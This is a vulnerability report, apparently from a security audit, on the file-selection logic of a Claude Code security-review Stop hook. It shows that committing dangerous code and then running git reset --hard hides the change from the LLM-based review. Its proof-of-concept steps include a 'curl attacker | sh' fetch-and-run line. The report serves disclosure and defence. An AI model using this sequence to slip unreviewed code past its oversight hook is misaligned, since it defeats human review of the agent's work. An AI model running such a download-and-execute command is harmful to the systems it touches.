### Title
Reset-away commit hides dangerous git changes from `compute_v2_review_set`'s review window - ([File: plugins/security-guidance/hooks/diffstate.py])

### Summary
`compute_v2_review_set` derives its review set purely from comparing the current git state (`git status --porcelain`, `git diff --name-only`) against a pre-turn stash baseline (`baseline_sha`) and a captured `head_at_capture` SHA, rather than from an append-only, execution-order log of every commit/content state that existed during the turn. Because the function only looks at the *final* delta between "now" and "baseline", any sequence of normal git operations (commit dangerous content, then `git reset --hard`/checkout back to a state matching the baseline) can make the working tree and HEAD converge back to the pre-turn baseline before Stop fires, causing `changed_since`/`dirty_now` to be empty for that file even though a dangerous commit object briefly existed and could have been pushed, referenced, or executed mid-turn.

### Finding Description
`compute_v2_review_set` (`plugins/security-guidance/hooks/diffstate.py:353-438`) computes:
- `dirty_now`: tracked-dirty ∪ new-untracked from `git status --porcelain=v1` [1](#0-0) , extended with commit-range diffs only `if head_at_capture` is an ancestor of the current HEAD (i.e., only for a strictly linear "HEAD advanced forward" history) [2](#0-1) .
- `changed_since`: `git diff --name-only <baseline_sha>` between the pre-turn stash snapshot and the current working tree [3](#0-2) .
- `review_set = dirty_now & changed_since` [4](#0-3) .

Both terms are computed as a snapshot comparison at Stop time, not as a monotonic union of everything that changed at any point in the turn. If, within one turn, the working tree/HEAD is driven back to a state that content-matches the `baseline_sha` snapshot (e.g., commit a dangerous file, then `git reset --hard <baseline-matching-ref>` or checkout back to the original branch/commit), then at Stop time:
- `git status --porcelain` shows no dirty tracked files (working tree matches HEAD, which now equals or resembles the pre-turn state).
- `git diff --name-only baseline_sha` shows no differences, because content is byte-identical to baseline.
- `_is_ancestor(head_at_capture, current_head)` is false (current HEAD is not a descendant of `head_at_capture` — it's a sibling/ancestor reached via reset/checkout), so the commit-range term contributing committed diffs is skipped entirely.

The result: `review_set` is empty, even though a commit containing the dangerous change was created and existed in the repository's object database (reachable via reflog) during the turn — long enough to be `git push`ed to a remote, referenced by another automated process, or read via `git show <sha>` by a subsequent Bash call before the reset. The Stop hook (`Stop-hook reviewed file selection`) never sees the file in the computed review set, so the LLM-based vulnerability scan never inspects the dangerous content, and no exit(2)/warning is raised.

This satisfies the exploit idea exactly: normal git operations (commit + reset/checkout) in a cloned repo shift the baseline/HEAD comparison state so a dangerous change is treated as "no change occurred" and is silently skipped from review.

### Impact Explanation
This breaks the core invariant of the security-guidance Stop-hook review pipeline — that all code changed by Claude during a turn is diffed and reviewed before the turn ends. An attacker who can get Claude to run a git sequence (commit dangerous shell/exec/auth-bypass code, then reset/checkout back to the prior state) can smuggle a dangerous, unreviewed commit into existence and interact with it (push, reference in `.git/refs`, trigger from another automation) without the deny/approval-review mechanism ever inspecting it. This matches "Unauthorized local command execution that bypasses Claude Code approval or deny controls" since the review/exit(2) gate that would otherwise force human awareness of dangerous code is bypassed entirely.

### Likelihood Explanation
Feasible with only normal git operations available to any turn that uses the Bash tool (no special privileges, no leaked keys, no social engineering beyond standard prompt-injection/agentic-loop scenarios already in scope for this plugin's threat model). The sequence (edit → commit → reset --hard/checkout) is a completely ordinary git workflow, not exploiting any git bug, and is not blocked by any check in `compute_v2_review_set`, `_git_status_porcelain`, or `_git_name_only`. It is deterministic and repeatable across sessions, since the review-set computation is a stateless snapshot diff with no persisted record of intermediate commits reachable only via reflog.

### Recommendation
Track every commit SHA that becomes reachable from HEAD at any point during the turn (e.g., via `git rev-list` over the HEAD reflog window bounded by `stop_hook`/turn start, similar to `_git_reflog_recent_commits` in `gitutil.py`) and union the file sets touched by those commits into `review_set`, independent of whether the final HEAD/working tree state has since reverted to match the baseline. Alternatively, treat any newly created commit object recorded in the reflog since `head_at_capture` was captured as always-reviewable, regardless of whether it remains reachable from the current HEAD at Stop time.

### Proof of Concept
Unit/integration test in the security-guidance hook test suite:
1. Initialize a git repo with an initial commit, capture `baseline_sha` via `capture_git_baseline(cwd)` and `head_at_capture` via `_git_rev_parse_head(cwd)`.
2. Write a "dangerous" file (e.g., `evil.sh` containing `curl attacker | sh`), `git add` + `git commit` it (HEAD advances to `C1`).
3. `git reset --hard <head_at_capture>` (or checkout back to the original commit/branch), restoring working tree and HEAD to the pre-turn state.
4. Call `compute_v2_review_set(cwd, baseline_sha, head_at_capture, {})`.
5. Assert failure of the invariant: `evil.sh` (or its path) is **absent** from the returned `review_paths`/`review_set`, while the commit `C1` containing it is still present in `git reflog` (`git log -g`) — demonstrating the dangerous change existed but was excluded from the computed review window.
6. Expected (fixed) behavior: `review_paths` should include `evil.sh` regardless of the final reset, because the commit was created during the reviewed turn.
